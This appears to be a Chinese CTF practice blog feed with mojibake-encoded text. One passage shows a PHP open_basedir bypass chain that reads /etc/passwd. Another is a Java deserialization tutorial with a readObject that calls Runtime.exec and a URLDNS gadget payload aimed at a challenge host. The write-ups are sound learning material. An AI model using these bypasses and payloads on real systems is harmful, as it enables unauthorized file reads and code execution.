title="2.ä½¿ç”¨glob://+ç›®å½•è¯»å–+åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass"></a>2.ä½¿ç”¨glob://+ç›®å½•è¯»å–+åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</h2><p>glob://æ˜¯ä¸€ä¸ªå°è£…åè®®å…¶ä¸ä¼šå—åˆ°open_basedirçš„å½±å“ã€‚<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡ä»¶è¯»å–çš„åŸç”Ÿç±»æˆ–è€…å‡½æ•°+glob://æ¥è¯»å–å„ç›®å½•çš„æ–‡ä»¶<br>å¦‚ä¸‹<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/4.png" class="" title="alt text"><br>ä¹Ÿå¯ä»¥ä½¿ç”¨scandir<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/5.png" class="" title="alt text"><br>è¿™äº›è¯»å–æ–¹æ³•å¯ä»¥ä½¿ç”¨<code>glob:///*/www/../*</code>è¿™ç§æ–¹æ³•æ¥è¯»å–varç­‰ç›®å½•<br>å½“æˆ‘ä»¬è¯»å–åˆ°flagçš„åå­—å’Œä½ç½®åå¯ä»¥ä½¿ç”¨chdirå’Œini_setæ¥ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;LSE&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;LSE&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><br>ç»™ä¸ªæ–‡ç« <a href="https://www.cnblogs.com/hookjoy/p/12846164.html">open_basedir bypass</a></p><h1 id="web806-æ— å‚RCE"><a href="#web806-æ— å‚RCE" class="headerlink" title="web806 æ— å‚RCE"></a>web806 æ— å‚RCE</h1><p>æ–¹æ³•å¦‚ä¸‹æ–‡ç« <br><a href="https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">æ— å‚RCE</a></p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
            <tag> å¤šè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–+URLDNSé“¾å­</title>
      <link href="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–</h1><p>ååºåˆ—åŒ–æ¼æ´,å…¶å®åœ¨ä¹‹å‰çš„pythonå’Œphpæ—©å°±æ¥è§¦è¿‡äº†,ä½†æ˜¯å…¶éƒ½æ²¡æœ‰javaé‚£ä¹ˆå‡ºå,javaè€³ç†Ÿèƒ½è¯¦çš„æ¼æ´å¥½åƒåŸºæœ¬éƒ½æ˜¯javaååºåˆ—åŒ–é€ æˆçš„ã€‚<br>javaçš„åºåˆ—åŒ–çš„ç›®çš„å…¶å®å’Œå…¶ä»–è¯­è¨€å¾ˆç›¸ä¼¼éƒ½æ˜¯ä¸ºäº†è¿œç¨‹ä¼ è¾“å¯¹è±¡ï¼Œä¿å­˜å¯¹è±¡ç­‰ã€‚javaçš„åºåˆ—åŒ–ä¼šå°†ä¸€ä¸ªå¯¹è±¡å¤„ç†æˆä¸€æ®µäºŒè¿›åˆ¶çš„å­—ç¬¦ï¼Œè¿™ä½¿å¾—ä¼ è¾“æ•ˆç‡çš„æé«˜å’Œå­˜å‚¨ç©ºé—´çš„ä¸‹è®²ï¼Œå¯¹æå‡æ€§èƒ½æ¥è¯´æ˜¯éå¸¸é‡è¦çš„ã€‚ä¸‹é¢æˆ‘æ¥æ¼”ç¤ºä¸€äº›åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹</p><h1 id="åºåˆ—åŒ–å’Œååºåˆ—çš„ä»£ç å®ç°"><a href="#åºåˆ—åŒ–å’Œååºåˆ—çš„ä»£ç å®ç°" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—çš„ä»£ç å®ç°"></a>åºåˆ—åŒ–å’Œååºåˆ—çš„ä»£ç å®ç°</h1><h2 id="ç±»person-java"><a href="#ç±»person-java" class="headerlink" title="ç±»person.java"></a>ç±»person.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç° Serializable æ¥å£ï¼Œè¡¨ç¤ºè¯¥ç±»å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ‰å‚æ„é€ æ–¹æ³•ï¼Œå®ç°èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ ‡è¯†æ–¹æ³•æˆ–æ¥å£æ˜¯é‡å†™çš„</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//é‡å†™äº† Object ç±»ä¸­çš„ toString() æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name = &#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age = &quot;</span> + age + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ç±»ç”¨é‡å†™äº†toStringè¿™æ ·å½“æˆ‘ä»¬ä½¿ç”¨System.out.printlnæ¥è¾“å‡ºç±»æ—¶å°±ä¼šè¾“å‡ºæ”¹ç±»çš„nameå’Œageä¿©ä¸ªæˆå‘˜å±æ€§ã€‚<br>æƒ³è¦ä½¿ä¸€ä¸ªç±»è¢«åºåˆ—åŒ–å°±éœ€è¦å®Œæˆæ¥å£Serializableã€‚<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªæ¥å£å…¶å®æ—¶ç©ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å®Œæˆè¿™ä¸ªæ¥å£çš„ä»»ä½•æ–¹æ³•ã€‚è¿™ä¸ªæ¥å£çš„ç›®çš„å…¶å®æ˜¯ä¸ºäº†ç»™æˆ‘ä»¬çš„ç±»ä¸Šä¸€ä¸ªæ ‡è®°å‘Šè¯‰JVMè¿™ä¸ªæ˜¯å¯åºåˆ—åŒ–çš„ç±»è€Œå·²</p><h2 id="åºåˆ—åŒ–ç±»Ser-java"><a href="#åºåˆ—åŒ–ç±»Ser-java" class="headerlink" title="åºåˆ—åŒ–ç±»Ser.java"></a>åºåˆ—åŒ–ç±»Ser.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream bos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;LSE&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        Serializ(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ³¨æ„æ˜¯åˆ©ç”¨oos.writeObject(obj);æ¥å‘åºåˆ—åŒ–åçš„å†…å®¹å†™å…¥ä¸€ä¸ªå¯¹è±¡çš„ã€‚æˆ‘ä»¬å°†ååºåˆ—åŒ–åçš„å­—ç¬¦åˆ©ç”¨SerializationDumperæ¥æŸ¥çœ‹ä¼šå‘ç°<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text"><br>ç±»çš„å†…å®¹ä½äºclassAnnotationsä¸‹ã€‚</p><h2 id="ååºåˆ—åŒ–UnSer-java"><a href="#ååºåˆ—åŒ–UnSer-java" class="headerlink" title="ååºåˆ—åŒ–UnSer.java"></a>ååºåˆ—åŒ–UnSer.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Object person=Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ˜¯é€šè¿‡readObject()æ¥è¿›è¡Œçš„ã€‚</p><h1 id="ååºåˆ—åŒ–çš„è¿‡ç¨‹"><a href="#ååºåˆ—åŒ–çš„è¿‡ç¨‹" class="headerlink" title="ååºåˆ—åŒ–çš„è¿‡ç¨‹"></a>ååºåˆ—åŒ–çš„è¿‡ç¨‹</h1><p>è¦æƒ³çŸ¥é“å¦‚ä½•è¿›è¡Œååºåˆ—æ”»å‡»é¦–å…ˆå¾—äº†è§£åŸå‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚<br>æˆ‘ä»¬æ¥ä¸‹ä¸€ä¸ªååºåˆ—åŒ–çš„æ–­ç‚¹æ¥çœ‹çœ‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"><br>å†è¿›å…¥readObjectåè¿›ä¸€æ­¥è°ƒè¯•ä¼šå‘ç°å…¶è¿›å…¥äº†readObject0æ­¥å…¥<br>æ–¹æ³•çš„å‰åŠä¸éƒ¨åˆ†æ˜¯å¤„ç†å—æ•°æ®çš„ï¼Œä¸é‡è¦æˆ‘ä»¬ç›´æ¥çœ‹å…¶å¤„ç†å¯¹è±¡çš„è¿‡ç¨‹<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶ä¸€ä¸ªä¸€ä¸ªå­—èŠ‚çš„è¿›è¡Œè¯»å–ï¼Œæ¥è¯»å–å…¶ç±»æè¿°ç¬¦ï¼Œå†switchå‡½æ•°ä¸­ä¸åŒçš„ç±»æè¿°ç¬¦ä¼šè¿›å…¥ä¸åŒçš„æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯ä¸ªå¯¹è±¡æ‰€ä»¥ä¼šè¿›å…¥TC_OBJECTä¸­<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>è¿›å…¥äº†readOrdinaryObjectæ–¹æ³•é‡Œ<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>å†è¿™ä¸ªæ–¹æ³•é‡Œæˆ‘ä»¬ä¼šå‘ç°å¦‚ä¸Šçš„åˆ¤æ–­ï¼ŒhasReadResolveMethodè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥åˆ¤æ–­ä¼ å…¥çš„ç±»æ˜¯å¦æœ‰é‡å†™readObjectçš„ï¼Œå¦‚æœé‡å†™äº†åˆ™ç›´æ¥è°ƒç”¨invokeReadResolveè¿™ä¸ªæ–¹æ³•æ¥å¤„ç†ã€‚æˆ‘ä»¬è¿›å…¥invokeReadResolve<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶ä¼šåˆ¤æ–­å…¶é‡å†™çš„readObjectæ˜¯å¦ä¸ºç©ºä¸ä¸ºç©ºåˆ™ä½¿ç”¨åå°„æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•</p><p>é‚£ä¹ˆè¿™æ—¶å€™æˆ‘ä»¬å°±çŸ¥é“äº†ï¼Œåªè¦åºåˆ—åŒ–çš„ç±»ä¸­æœ‰é‡å†™readObjectçš„ï¼Œå†ååºåˆ—æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªç±»ã€‚è¯´èµ·æ¥è¿™ä¸ªreadObjectå°±å’Œphpçš„<code>__destructå¾ˆåƒ</code>é‡å†™äº†çš„readObjectå°±å’Œ<code>__destruct</code>ä¸€æ ·ç®—æ˜¯ååºåˆ—æ¼æ´çš„å…¥å£ã€‚</p><h1 id="javaååºåˆ—åŒ–çš„å‡ ç§æ”»å‡»æ–¹å¼"><a href="#javaååºåˆ—åŒ–çš„å‡ ç§æ”»å‡»æ–¹å¼" class="headerlink" title="javaååºåˆ—åŒ–çš„å‡ ç§æ”»å‡»æ–¹å¼"></a>javaååºåˆ—åŒ–çš„å‡ ç§æ”»å‡»æ–¹å¼</h1><h2 id="readObjectä¸‹å†™ç”¨æ¶æ„ä»£ç "><a href="#readObjectä¸‹å†™ç”¨æ¶æ„ä»£ç " class="headerlink" title="readObjectä¸‹å†™ç”¨æ¶æ„ä»£ç "></a>readObjectä¸‹å†™ç”¨æ¶æ„ä»£ç </h2><p>æˆ‘ä»¬éƒ½çŸ¥é“äº†å¦‚æœé‡å†™äº†readObjectæ—¶å†ååºåˆ—è°ƒç”¨æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªé‡å†™çš„readObjectï¼Œé‚£ä¹ˆå¦‚æœå†è¿™ä¸ªåç«¯æœ‰è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œå…¶readObjectä¸‹å†™æœ‰æ¶æ„ä»£ç é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç° Serializable æ¥å£ï¼Œè¡¨ç¤ºè¯¥ç±»å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//æ— å‚æ„é€ æ–¹æ³•ï¼Œåœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ‰å‚æ„é€ æ–¹æ³•ï¼Œå®ç°èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™äº† Object ç±»ä¸­çš„ toString() æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name = &#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age = &quot;</span> + age + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class="" title="alt text"><br>ååºåˆ—ä¸Šé¢çš„ç±»æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç¡®å®å¼¹äº†è®¡ç®—æœºï¼Œä½†æ˜¯è¿™ä¸ªå¾ˆæ— è¶£æ¯•ç«Ÿå“ªé‡Œä¼šæœ‰å¼€å‘è€…ä¼šå†ä¸€ä¸ªçš„ç±»ä¸‹é‡å†™ä¸€ä¸ªreadObjectçš„å†…å®¹æ˜¯æ¶æ„ä»£ç å‘¢ã€‚æœ‰æˆ‘ä»¬ä¹Ÿä¸å¤§å¯èƒ½çŸ¥é“æ˜¯å“ªä¸€ä¸ªç±»ã€‚</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>å­¦ä¹ è¿™ä¸ªé“¾æˆ‘ä»¬å…ˆè¦çŸ¥é“ä¸€ä¸ªå·¥å…·å°±æ˜¯</p><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>è¿™ä¸ªå·¥å…·æ˜¯Gabriel Lawrence (@gebl)å’ŒChrisFrohoff (@frohoff)è¿™ä¸¤ä½æå‡ºåˆ©â½¤Apache Commons Collectionsæ¥æ„é€ å‘½ä»¤æ‰§â¾çš„åˆ©â½¤é“¾çš„ä½œè€…å†™çš„ä¸€ä¸ªå¼€æºé¡¹ç›®å®ƒå¯ä»¥è®©â½¤æˆ·æ ¹æ®â¾ƒâ¼°é€‰æ‹©çš„åˆ©â½¤é“¾ï¼Œâ½£æˆååºåˆ—åŒ–åˆ©â½¤æ•°æ®ï¼Œé€šè¿‡å°†è¿™äº›æ•°æ®å‘é€ç»™â½¬æ ‡ï¼Œä»â½½æ‰§â¾â½¤æˆ·é¢„å…ˆå®šä¹‰çš„å‘½ä»¤<br>è€ŒURLDNSä¹Ÿæ˜¯è¿™æ‰€ä»¥é“¾å­é‡Œæœ€ç®€å•çš„é“¾å­ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™ä¸ªé“¾å­å¹¶ä¸èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå…¶åªèƒ½è¿›è¡Œä¸€ä¸ªDNSçš„è®¿é—®ï¼Œä½†æ˜¯å› ä¸ºå…¶è°ƒç”¨çš„ç±»éƒ½æ˜¯javaçš„å†…ç½®ç±»æ— éœ€å…¶ä»–ä¾èµ–ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†å…¶å¯ä»¥æ¥æ¢æµ‹æ˜¯å¦å­˜åœ¨javaååºåˆ—æ¼æ´ã€‚<br>æˆ‘ä»¬éƒ½çŸ¥é“ååºåˆ—åŒ–æœ€é‡è¦çš„æ˜¯å…¥å£ï¼Œå†phpä¸­å…¥å£æ˜¯<code>__destruct</code>è€Œjavaå°±æ˜¯readObjectã€‚è€Œè¿™æ¡é“¾çš„å…¥å£å°±æ˜¯hashmapé‡å†™çš„readObjectã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹å…¶æ„é€ çš„payloadé•¿ä»€ä¹ˆæ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°payloadä¸­æœ‰HashMapè¿™ä¸ªç±»å’ŒURLè¿™ä¸¤ä¸ªç±»ã€‚æˆ‘ä»¬å…ˆåˆ†æHashMap<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class="" title="alt text"><br>è¿›å…¥HashMapæˆ‘ä»¬ä¼šå‘ç°å…¶å‚æ•°ä¸ºKeyå’ŒValueã€‚å› ä¸ºæˆ‘ä»¬ä¸»è¦è¦çœ‹çš„æ˜¯readObjectæ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶æœ€åå¥–keyä¼ å…¥äº†hashè¿™ä¸ªå‡½æ•°æˆ‘ä»¬è¿›å…¥è¿™ä¸ªå‡½æ•°<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class="" title="alt 